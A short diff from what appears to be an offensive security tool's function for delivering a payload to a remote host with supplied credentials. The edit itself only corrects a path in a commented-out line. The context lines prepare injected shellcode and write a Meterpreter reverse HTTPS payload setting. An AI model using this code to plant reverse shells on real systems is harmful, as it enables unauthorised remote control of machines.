@@ -240,7 +240,7 @@ def deploy_hex2binary(ipaddr, port, username, password):
         core.update_options("POWERSHELL_SOLO=ON")
         core.print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
 
-        #with open(os.path.join(core.userconfigpath, "/payload_options.shellcode"), "w") as filewrite:
+        #with open(os.path.join(core.userconfigpath, "payload_options.shellcode"), "w") as filewrite:
         # format needed for shellcode generation
         filewrite = file(core.userconfigpath + "payload_options.shellcode", "w")
         filewrite.write("windows/meterpreter/reverse_https {0},".format(port))
